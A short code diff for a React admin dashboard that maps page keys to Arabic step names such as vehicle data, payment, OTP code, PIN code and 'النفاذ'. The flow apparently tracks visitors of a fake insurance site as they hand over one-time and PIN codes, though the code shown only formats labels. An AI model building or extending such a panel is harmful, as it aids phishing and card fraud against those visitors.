@@ -124,10 +124,31 @@ export default function DashboardPage() {
     { value: "step5", label: "📱 رقم الهاتف" },
   ];
 
+  // Map database page values to Arabic names
+  const pageArabicNames: Record<string, string> = {
+    "home": "الرئيسية",
+    "insur": "بيانات المركبة",
+    "phone": "رقم الهاتف",
+    "confi": "رمز PIN",
+    "compar": "اختيار الباقة",
+    "check": "الدفع",
+    "step2": "رمز OTP",
+    "step3": "رمز PIN",
+    "step4": "النفاذ",
+    "step5": "رقم الهاتف",
+  };
+
   // Convert page route to Arabic name
   const getPageArabicName = (page: string): string => {
+    if (!page) return "غير متصل";
+    // First check the map
+    if (pageArabicNames[page]) return pageArabicNames[page];
+    // Then check pageOptions
     const pageOption = pageOptions.find(p => p.value === page);
-    return pageOption?.label?.replace(/^[^\s]+\s/, '') || page || "غير محدد";
+    if (pageOption) {
+      return pageOption.label.replace(/^[^\s]+\s/, '');
+    }
+    return page;
   };
 
   // Sort requests by the original submission time (newest first)
